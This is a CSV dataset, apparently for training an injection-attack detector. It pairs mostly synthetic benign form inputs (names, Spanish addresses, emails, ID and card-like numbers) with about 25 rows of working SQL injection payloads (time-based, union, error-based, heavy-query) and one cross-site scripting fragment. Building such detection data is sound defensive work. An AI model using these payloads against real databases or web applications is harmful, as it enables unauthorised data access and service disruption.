payload,attack_type,label
1721278325772936,norm,0
lozier,norm,0
alguese,norm,0
starr-fjelmose@cdgranadabaila.travel,norm,0
30482828p,norm,0
"c/ ulises 17,",norm,0
47815,norm,0
rube,norm,0
enlutada,norm,0
2354,norm,0
blount,norm,0
sugesto,norm,0
raian,norm,0
suau,norm,0
germain@elcorteitaliano.cat,norm,0
78977050h,norm,0
"c/ de la sabina, s/n 8?b",norm,0
betelu,norm,0
24224,norm,0
mcglynn,norm,0
midkiff_mikuni@directoriogratuito.kh,norm,0
58772485x,norm,0
"calle rascafria, 103,",norm,0
gimialcn,norm,0
39515,norm,0
3582197540300309,norm,0
sprouse,norm,0
zanquita,norm,0
1827,norm,0
addons,norm,0
14ab214c6n,norm,0
karla,norm,0
jauregui cortines,norm,0
quartet@cabare.com.cs,norm,0
86800649y,norm,0
"paratge lila 30, 10?c",norm,0
espluga de francol l',norm,0
9091453994786923,norm,0
dyck,norm,0
acre,norm,0
pereda barrio,norm,0
barrymore@hipermadrid.pe,norm,0
52137467d,norm,0
"doctor waksmann, 120, 7?b",norm,0
caudete,norm,0
31282,norm,0
3161746053397457,norm,0
chao,norm,0
62si27t8ico,norm,0
4403,norm,0
patacki,norm,0
encrasar,norm,0
xifr,norm,0
pleasande@doloresmusculares.aq,norm,0
86943454g,norm,0
"sanchez 49,",norm,0
9008082484622624,norm,0
lubna,norm,0
o+bispar,norm,0
adgardo,norm,0
pealver palenzuela,norm,0
36914497a,norm,0
"nucleo santiago apostol 34, 4?f",norm,0
zabalza,norm,0
20491,norm,0
4811716935763521,norm,0
erickson,norm,0
inord2n6da7e401,norm,0
5445,norm,0
procacci,norm,0
a65esad0,norm,0
efrn,norm,0
conde,norm,0
calle castaos 90,norm,0
torre-cardela,norm,0
25330,norm,0
4867284155125635,norm,0
oran,norm,0
mialgi5,norm,0
tesisteco avi,norm,0
pepet@naturalchild.co,norm,0
pablo iglesias s/n 2?f,norm,0
01308,norm,0
6702564951251728,norm,0
technoso,norm,0
remante,norm,0
919,norm,0
briseboi,norm,0
afoscarse,norm,0
net.valdez@salaparis.gt,norm,0
39699852n,norm,0
"c/ja del indiano, s/n,",norm,0
illano,norm,0
37115,norm,0
2872946473881757,norm,0
spears,norm,0
comisorio,norm,0
triana,norm,0
del ngel kercad,norm,0
pesche@campodegolf.com.sy,norm,0
10421521z,norm,0
"etorbidea askatasuna 170, 8?a",norm,0
valseca,norm,0
2754013363983769,norm,0
huong,norm,0
419747iv6,norm,0
1729,norm,0
tse,norm,0
orientalista,norm,0
victoria de los angeles,norm,0
ventura motn,norm,0
sala@mystyleperfume.ls,norm,0
"roure, 43, 3?d",norm,0
32648,norm,0
7771884953425478,norm,0
meggy,norm,0
3o22ciabl3,norm,0
telema,norm,0
ayat rozas,norm,0
verani@viajesdacapalla.gq,norm,0
25109956m,norm,0
"quinita flores 75,",norm,0
botarell,norm,0
45370,norm,0
3893864101962581,norm,0
etchieso,norm,0
arrego76arse,norm,0
9159,norm,0
marieann,norm,0
1i6p06ej7,norm,0
penarroya ingla,norm,0
gayle@freetag.name,norm,0
54709157t,norm,0
"el halcon 154, 8?f",norm,0
03314,norm,0
1571256483586961,norm,0
evin,norm,0
sa6r2,norm,0
sibonet,norm,0
gorcy.davis@carmensanmartin.bo,norm,0
16601924h,norm,0
"estrada mendiarte s/n, 10?a",norm,0
destriana,norm,0
25307,norm,0
sa89gn,norm,0
9639,norm,0
longo,norm,0
cojera,norm,0
armero filippi,norm,0
uzaki@23horas.ie,norm,0
calle madagascar 130,norm,0
24391,norm,0
lei-see,norm,0
ineluctable,norm,0
rahue,norm,0
serna kovac,norm,0
pozzetto@miplat.am,norm,0
51795949h,norm,0
"calle del derecho 17,",norm,0
cervera de la caada,norm,0
50693,norm,0
9473535060757439,norm,0
havis,norm,0
7a2a6t1ro,norm,0
1858,norm,0
cooksey,norm,0
pavorde,norm,0
elois,norm,0
gomero gallardo,norm,0
terrio@likeanangel.dz,norm,0
46773841y,norm,0
"paratge ter, 33,",norm,0
arndiga,norm,0
8554607392278464,norm,0
vial,norm,0
muntaner nevado,norm,0
vasilescu.lisi@drogasvirtuales.sc,norm,0
37905890g,norm,0
"luis braille, 33, 12?d",norm,0
matar,norm,0
40529,norm,0
4608056297024601,norm,0
werling,norm,0
encalador,norm,0
7012,norm,0
barnhill,norm,0
ten.tar,norm,0
quintilio,norm,0
naharro,norm,0
vitola@23horas.ad,norm,0
38980059g,norm,0
"calle isis, 180",norm,0
45810,norm,0
6172398321911966,norm,0
janeva,norm,0
desconsolar,norm,0
lzaro,norm,0
hinwood-laretei@addl.es,norm,0
infante juan manuel s/n 5?a,norm,0
canfranc,norm,0
26323,norm,0
9738066615220073,norm,0
radioelctrica,norm,0
3679,norm,0
blondell3,norm,0
apotrerar,norm,0
mochn quer,norm,0
peller@arvigar.gs,norm,0
30503437d,norm,0
"carrer asturies, 49",norm,0
49135,norm,0
8582534834926521,norm,0
aghili,norm,0
escultrico,norm,0
colunga corrius,norm,0
bukoontot@google-movil.cm,norm,0
69634179t,norm,0
c/ asuncion 115 5e,norm,0
almonacid de la sierra,norm,0
6689689469452036,norm,0
rorke,norm,0
3u23pe,norm,0
3318,norm,0
philippa,norm,0
carroar,norm,0
salgado pladellorens,norm,0
schwab.carli@emepleo.info,norm,0
"calle batalla de muhlberg, 25, 6?a",norm,0
villadoz,norm,0
27860,norm,0
brenda,norm,0
8ienne2s6,norm,0
alpar-ornstein@rockefeller.nu,norm,0
15423399j,norm,0
horcajo de montemayor,norm,0
46844,norm,0
gourley,norm,0
sensualmente,norm,0
consalve,norm,0
c406l2n5,norm,0
fabrizio,norm,0
kunneke@storagecraft.nz,norm,0
89740217j,norm,0
"c/ gravina, s/n",norm,0
igzquiza,norm,0
17867,norm,0
6453670410602968,norm,0
zandra,norm,0
agenor,norm,0
iraola rudi,norm,0
chamberlain@muevemiweb.al,norm,0
calle jaime ferranz 51,norm,0
castellanos de zapardiel,norm,0
12163,norm,0
"1' where 6406=6406;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1
"1) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (4666=4666",sqli,1
-3136%') or 3400=6002,sqli,1
1) where 7956=7956 or sleep(5)#,sqli,1
-7387'))) order by 1--,sqli,1
1')) as gfzb where 7904=7904;begin dbms_lock.sleep(5); end--,sqli,1
"1))) union all select null,null,null#",sqli,1
"-5622"" where 7970=7970 union all select 7970,7970,7970,7970,7970--",sqli,1
"1"")) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((""smnw"" like ""smnw",sqli,1
"-9860%"" union all select 6996,6996,6996,6996,6996,6996#",sqli,1
"1));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((7240=7240",sqli,1
-2604)) as sekb where 6897=6897 or 1000=7683,sqli,1
"1%""))) waitfor delay '0:0:5'--",sqli,1
"1"") as nraw where 7984=7984 and elt(3114=3114,sleep(5))#",sqli,1
1');begin dbms_lock.sleep(5); end and ('jzlr'='jzlr,sqli,1
"1%"");select benchmark(5000000,md5(0x714e4153))#",sqli,1
"1'))) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1
"1%"")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (((""%""=""",sqli,1
"-4259')) as usqu where 5419=5419 or elt(8325=8837,8837)--",sqli,1
"1')) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('ijyi'='ijyi",sqli,1
-1638' or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'xkne'='xkne,sqli,1
"-2583"") where 3455=3455 or make_set(9354=9354,7185)--",sqli,1
"-6267""))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""rqws""=""rqws",sqli,1
"1%"";call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
"1%'))) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
8496429893525706,norm,0
tweddle,norm,0
t324a3ra5a,norm,0
4932,norm,0
sirevici,norm,0
di0cut6dor7,norm,0
jener monaj,norm,0
90230020p,norm,0
los polancos 133,norm,0
"pintanos, los",norm,0
6034871098442134,norm,0
berrisfo,norm,0
zaguero,norm,0
vingelli9@custombikesclothes.fr,norm,0
39202408n,norm,0
"c/ montaer ruiz, 24, 12a",norm,0
fuentelmonge,norm,0
3609841962548925,norm,0
isador,norm,0
m*ule38,norm,0
4906,norm,0
marcanti,norm,0
cimorra,norm,0
jezabel,norm,0
pawluszek segu,norm,0
knippenberg@soyriojano.cf,norm,0
05782219l,norm,0
"c/ ricardo codoer, 112,",norm,0
iza,norm,0
brunhild,norm,0
te3496,norm,0
martinn sampayo,norm,0
allaert@chicasdiabolo.ru,norm,0
63974696n,norm,0
"calle plantio, 178,",norm,0
fla,norm,0
50629,norm,0
benning,norm,0
demostrar,norm,0
6212,norm,0
sask,norm,0
refriega,norm,0
isidoro,norm,0
rudie@deuxmanagement.jo,norm,0
06918701w,norm,0
"calle la caldera, 76 11-c",norm,0
guilas,norm,0
4898771590601702,norm,0
lap,norm,0
ramblizo,norm,0
42287106l,norm,0
"calle beato tomas de zumarraga, 89 12-c",norm,0
8043015940180984,norm,0
olsen,norm,0
5urgui8a,norm,0
6087,norm,0
spindler1,norm,0
trincha-32r1,norm,0
stoeckel@hacia.sa,norm,0
08363269d,norm,0
"alqueria de pixarroda, 27",norm,0
tossa de mar,norm,0
0277189059505279,norm,0
dotan,norm,0
rescisorio,norm,0
terribas,norm,0
leftwich@sms24h.sb,norm,0
valdemaluque,norm,0
12232,norm,0
5580428033394873,norm,0
masahiro,norm,0
comba,norm,0
1140,norm,0
humfrey,norm,0
e23i6gulo,norm,0
nicolo,norm,0
brines grimalda,norm,0
floor@aebo.af,norm,0
88341714w,norm,0
"calle hernan cortes, 58,",norm,0
29639,norm,0
0052422482512057,norm,0
38i2t702,norm,0
nanni-prucnal@fighting-machines.gf,norm,0
08447437c,norm,0
"c/ reina del cielo 136, 8-d",norm,0
46510,norm,0
0878247632477262,norm,0
09ca93a4i9lar,norm,0
973,norm,0
merl,norm,0
70p89c9cion958,norm,0
quintn,norm,0
bricat,norm,0
drozdek.waechter@tarifasdevuelos.bj,norm,0
03046730n,norm,0
"ronda sant antoni maria claret 144,",norm,0
villacastn,norm,0
jawad,norm,0
92frico,norm,0
hans,norm,0
pipiolo sandrini,norm,0
velero@softwaresaas.ec,norm,0
30666350j,norm,0
"c/ barriada nueva andalucia, 79, 5?f",norm,0
lora,norm,0
12965,norm,0
anja,norm,0
3803,norm,0
vivie4,norm,0
descarada,norm,0
lian,norm,0
colosse@velaconsultores.gob,norm,0
85640413m,norm,0
"c/ san juan bautista 66, 1?f",norm,0
fuente de pedro naharro,norm,0
24410,norm,0
1710045357867718,norm,0
inusitado,norm,0
de la barca pitti,norm,0
dierking3@carmensanmartin.kn,norm,0
69557398q,norm,0
"diaz camacho 107, 2-a",norm,0
9636562879352994,norm,0
beilul,norm,0
trashumacin,norm,0
389,norm,0
hadel,norm,0
hatajo,norm,0
yasna,norm,0
brivio,norm,0
hymen_israeli@aulahost.vc,norm,0
"cami llorito, 38",norm,0
ansa-sobrarbe,norm,0
5968115219030593,norm,0
bordin,norm,0
rebalg1r,norm,0
jeria cifr,norm,0
litchterman.steiner6@myalbum.by,norm,0
88426780z,norm,0
"calle costa de llevant, 52",norm,0
murillo el cuende,norm,0
34111,norm,0
ligurs,norm,0
retos9a1o,norm,0
2268,norm,0
braham,norm,0
wieth@camiones-hibridos.md,norm,0
47355557y,norm,0
"cami can rabella, s/n",norm,0
"manzano, el",norm,0
5393761266970595,norm,0
virchick1,norm,0
superable,norm,0
leonila,norm,0
duran manero,norm,0
paris-loisel@viavilano.cr,norm,0
49511678s,norm,0
"burgos, s/n, 1f",norm,0
boimorto,norm,0
08191,norm,0
1959107690181502,norm,0
cycelia,norm,0
rosoli,norm,0
1166,norm,0
swope,norm,0
tr?abal,norm,0
gutman@latiendadecolchones.mn,norm,0
86626999y,norm,0
plaza tilos s/n,norm,0
cubillas de santa marta,norm,0
10182,norm,0
7578225963562090,norm,0
raha,norm,0
de5pi6ar4za4,norm,0
helano,norm,0
sagu cnstenla,norm,0
santaniello_tabernero@enfuerteventura.com.ni,norm,0
20847295a,norm,0
plaza asociacion de la prensa 107,norm,0
segura de los baos,norm,0
14140,norm,0
reid5,norm,0
chimenea,norm,0
544,norm,0
jailyn,norm,0
irado,norm,0
arn cantisn,norm,0
norring-fujikawa@autoconstruccion.au,norm,0
"plza. salamanca 39,",norm,0
langa del castillo,norm,0
50780,norm,0
2787973107257855,norm,0
jaswal,norm,0
d060u2ar,norm,0
hania,norm,0
limongi diguez,norm,0
hesseman.dolen@gaudio.mu,norm,0
calle vallseca 123,norm,0
pleitas,norm,0
5176682769033876,norm,0
guillory,norm,0
arme!lluela,norm,0
5155,norm,0
mcculloc,norm,0
menju,norm,0
iris,norm,0
duo_davalos@designworld.cz,norm,0
23251820q,norm,0
isla de cuba 85 3-b,norm,0
coripe,norm,0
06927,norm,0
zauhar,norm,0
semanera,norm,0
ezequiel,norm,0
langellotti,norm,0
schaafsma@gay-tantra.sj,norm,0
"calle alfaz del pi, 96 11?d",norm,0
villanueva del rebollar,norm,0
38450,norm,0
8198356178876064,norm,0
grimsley,norm,0
luego,norm,0
3880,norm,0
trampeador,norm,0
kovac,norm,0
97230292t,norm,0
"calle de can castellvi 35, 10-h",norm,0
vindel,norm,0
28194,norm,0
humfrid,norm,0
expendedora,norm,0
leonelo,norm,0
carvajal,norm,0
lightner.manor@rosaserigrafia.as,norm,0
83217349z,norm,0
castellnovo,norm,0
19127,norm,0
3413347210986966,norm,0
ania,norm,0
esmilcea,norm,0
3040,norm,0
huerfanidad,norm,0
robertino,norm,0
hindman@primeracasa-ebs.il,norm,0
91220241x,norm,0
"jose gomez gallito, 107,",norm,0
alarba,norm,0
32252,norm,0
0577312599845778,norm,0
cowart,norm,0
inoportunamente,norm,0
cibeles,norm,0
garrudo castellon,norm,0
carminati@granbretana.com.uk,norm,0
33273113w,norm,0
"calle pea 49, 9?b",norm,0
munbrega,norm,0
4611888318080805,norm,0
merriell,norm,0
adapuesto,norm,0
3151,norm,0
alvean,norm,0
9o52cardea7,norm,0
benito@mayoriasilenciosa.mu,norm,0
16574331w,norm,0
calle juan de sevilla 102 3c,norm,0
cabanabona,norm,0
33001,norm,0
kouhi,norm,0
4az,norm,0
roehn.kernke@eldeseodepecar.ec,norm,0
78267819s,norm,0
"calle rendona 45, 5-a",norm,0
8914644367191799,norm,0
fady,norm,0
a8o8decer,norm,0
2049,norm,0
sonoe,norm,0
idalio,norm,0
hirn,norm,0
portal tauler,norm,0
edlund@cementoscalibra.yu,norm,0
"c/ mirra 25,",norm,0
sant quirze de besora,norm,0
27784,norm,0
8648898617825850,norm,0
meier,norm,0
c6nte9osa,norm,0
nimia,norm,0
buisn andres,norm,0
oliveira_aptekman@engibraltar.va,norm,0
"inocencia alayon, s/n 4-f",norm,0
san bartolom de la torre,norm,0
12510,norm,0
3227728964471059,norm,0
nadav6,norm,0
pent0et3o,norm,0
3244,norm,0
keer,norm,0
gala,norm,0
amarili,norm,0
waggenheim@rubirubi.info,norm,0
55265136t,norm,0
"c/ general merry del val, s/n",norm,0
45674,norm,0
2996877022240469,norm,0
wa77en,norm,0
"torrent de can caralleu 48, 12-g",norm,0
telde,norm,0
50513,norm,0
7745667684469889,norm,0
brain,norm,0
c7ada98o,norm,0
7242,norm,0
kalpak,norm,0
tolera9lemen8e,norm,0
sixto,norm,0
peredo huecas,norm,0
byron@vinavilano.gl,norm,0
21468433a,norm,0
"toril, 171 5h",norm,0
45790,norm,0
5036144025003599,norm,0
edlene,norm,0
descote,norm,0
albiol,norm,0
blankenship@likeanangel.tc,norm,0
14554532v,norm,0
"calle jose espejo, 130, 12?a",norm,0
42148,norm,0
muth,norm,0
tom159,norm,0
3046,norm,0
neufeld,norm,0
ru5runears2,norm,0
leobaldo,norm,0
benson-rabasa@mareventsprotocolosocial.ad,norm,0
53087910t,norm,0
"zafiro, s/n 4?b",norm,0
urdiales del pramo,norm,0
50174,norm,0
wei-tsig8,norm,0
oti sineiro,norm,0
sabu@aridossanchez.lt,norm,0
"avinguda pinyana, 7 2-h",norm,0
avellanosa de mu,norm,0
06196,norm,0
4780723426433072,norm,0
teddie,norm,0
abellot*ada,norm,0
new,norm,0
583opi4,norm,0
donaldo,norm,0
castell sargatal,norm,0
radir@diagnosticoradiologico.mil,norm,0
58222899d,norm,0
"camino hoya mondongo, 124",norm,0
galende,norm,0
01267,norm,0
3892784649587009,norm,0
vacher,norm,0
coxcojita,norm,0
quiliano,norm,0
77232447b,norm,0
pombal 114 3?d,norm,0
puerto de bjar,norm,0
5399041434530750,norm,0
ramesh,norm,0
cane5o,norm,0
8516,norm,0
haroun,norm,0
lluv8os4,norm,0
einar,norm,0
vano branchadell,norm,0
02650843r,norm,0
"c/ la hoz, 17",norm,0
pia de campos,norm,0
3556606130011191,norm,0
sandie,norm,0
en8relan3amien0o,norm,0
osteicoechea uslet,norm,0
pavlow@permutatucasa.fm,norm,0
60537126e,norm,0
"luis de gongora, 189",norm,0
9438831900620350,norm,0
mariana,norm,0
emblanquimiento,norm,0
1789,norm,0
sari7,norm,0
4m4or6711a662,norm,0
corico,norm,0
sebastian_ferdi@tintaultravioleta.mv,norm,0
95549133a,norm,0
"sayago, 156,",norm,0
baos de molgas,norm,0
28760,norm,0
hocutt,norm,0
monte9a,norm,0
sibila,norm,0
garcez iturriria,norm,0
neugebauer@buscamoto.gw,norm,0
37246742j,norm,0
"galeno 106, 9?c",norm,0
ciadoncha,norm,0
17744,norm,0
8444341614355746,norm,0
tiefenth,norm,0
i77ovar,norm,0
8436,norm,0
rini,norm,0
inobediecia,norm,0
donaciano,norm,0
matienzo gallifa,norm,0
69082096d,norm,0
c/ guillen santacilla 94,norm,0
estepa,norm,0
40151,norm,0
harmonie,norm,0
6r5int3805,norm,0
parmenia,norm,0
ikediek torrades,norm,0
tarp@redstarz.asia,norm,0
don juan 126,norm,0
"oso, el",norm,0
17403,norm,0
3786004753545909,norm,0
3andador4,norm,0
1112,norm,0
brion6,norm,0
demos3rativa,norm,0
gavald,norm,0
selk@inversioneolica.ee,norm,0
45854746z,norm,0
"c/ cal correu, 0,",norm,0
cbdar,norm,0
08030,norm,0
cal,norm,0
acrianzada,norm,0
mairozio,norm,0
victor juan,norm,0
ballasko@quehaces.mr,norm,0
78258633y,norm,0
"calle sierra del quintanar, 199 9-b",norm,0
gaianes,norm,0
2930629510541352,norm,0
ex074ico,norm,0
1230,norm,0
iorgo,norm,0
c0l0o4a,norm,0
bentez monill,norm,0
mouchet@007tv.fj,norm,0
50159319e,norm,0
"antonio toledano, 78, 10?h",norm,0
roelos de sayago,norm,0
49167,norm,0
uriah,norm,0
cabildeo,norm,0
maestre camprubi,norm,0
eckstine@blueeyes.eu,norm,0
46942381w,norm,0
"guadalajara, 101 4-e",norm,0
venialbo,norm,0
17861,norm,0
6913071576619939,norm,0
beland,norm,0
gravoso,norm,0
7192,norm,0
ryszard,norm,0
e1bud8,norm,0
alarico,norm,0
nrez muriscot,norm,0
gude1@messadivoce.ai,norm,0
"logroo, 98, 5-d",norm,0
sant lloren savall,norm,0
09228,norm,0
9589985001483437,norm,0
harty,norm,0
torns,norm,0
llobet,norm,0
confirm(2)>/,xss,1
brace4@velazquezlarraaga.kz,norm,0
19783837l,norm,0
"alcalde lopez rancao, 194, 3-e",norm,0
vilafams,norm,0
09270,norm,0
1499600534131254,norm,0
mundy,norm,0
alatn,norm,0
5642,norm,0
chan+quete,norm,0
jernima,norm,0
zuiga urbina,norm,0
grandinetti@mariposasentudia.mm,norm,0
69653229y,norm,0
"cruz de caravaca, 177",norm,0
daimiel,norm,0
14970,norm,0
4159457629727955,norm,0
valcourt,norm,0
encuar,norm,0
dels,norm,0
brau ganfornina,norm,0
angele6@juegossonic.com.eh,norm,0
64721683m,norm,0
c/ francisco grande cobian 90 4-e,norm,0
uju,norm,0
41570,norm,0
5068023807822442,norm,0
loudiadi,norm,0
in85ecuacin,norm,0
1304,norm,0
athony,norm,0
irresolucin,norm,0
nemesio,norm,0
bedmar,norm,0
veronese@prestigecars.tv,norm,0
99020664y,norm,0
"calle doctor jose manuel pascual y pascual 146, 4?c",norm,0
torrecilla del monte,norm,0
29620,norm,0
0936495801431480,norm,0
or5i6or6i686,norm,0
llull valls,norm,0
ordezanka@arroyo-molinos.dj,norm,0
calle oxigeno 197,norm,0
costur,norm,0
49495,norm,0
7482251600785207,norm,0
witney,norm,0
malandrn,norm,0
546,norm,0
kipnis,norm,0
fantaseadora,norm,0
aitor,norm,0
scanlon@theroxyblue.ng,norm,0
28045405x,norm,0
alcalde gregorio espino 165,norm,0
pozanco,norm,0
18212,norm,0
3596949565075836,norm,0
dud,norm,0
rayadillo,norm,0
henriquez femenias,norm,0
seymour@evelin.gn,norm,0
81587737k,norm,0
"c/ fray diego de cadiz, 50",norm,0
mombuey,norm,0
3302117123489448,norm,0
kiyohara,norm,0
47761an0i59r,norm,0
576,norm,0
downs,norm,0
tapinga,norm,0
jemima,norm,0
sunyer lleix,norm,0
abadia@comercioenlacalle.er,norm,0
87348482w,norm,0
"c/ carranque, 113 5?a",norm,0
45240,norm,0
8490972534756597,norm,0
kobeski,norm,0
prueba,norm,0
vivencio,norm,0
goyenaga,norm,0
lenya@fbi-criminal-network.com.mil,norm,0
hermanos barral 61,norm,0
cantaracillo,norm,0
40190,norm,0
5076820691273276,norm,0
sosa,norm,0
fraccionario,norm,0
9253,norm,0
trung,norm,0
fragmentar,norm,0
quiyen,norm,0
ricci@redhost.is,norm,0
89821319v,norm,0
pl. herrera de los navarros 68 12-h,norm,0
palacios del arzobispo,norm,0
8322438262219801,norm,0
chung,norm,0
reele.cto,norm,0
roussel@santacruzdelvoto.ws,norm,0
96269598q,norm,0
calle bernat de santa eugenia 90,norm,0
sariego,norm,0
7626699319590675,norm,0
onofredo,norm,0
domeable,norm,0
2864,norm,0
babar4,norm,0
cornisamen!to,norm,0
miller_fiore9@olvidalo.sy,norm,0
17652259n,norm,0
calle segismundo moret 93 1?a,norm,0
50297,norm,0
0614375180233873,norm,0
racette,norm,0
j804n86o,norm,0
puy,norm,0
borgeaud@enmenorca.com.om,norm,0
52984297w,norm,0
"jabeque, 86,",norm,0
relleu,norm,0
tetreaul7,norm,0
espavorida,norm,0
9564,norm,0
23l8noi7e,norm,0
bez clua,norm,0
gretler-rinell@magadan.com.yu,norm,0
38888523p,norm,0
lugar grela 152 1?f,norm,0
19185,norm,0
bui,norm,0
soportador,norm,0
trilles aedo,norm,0
arena@productosgarantizados.uy,norm,0
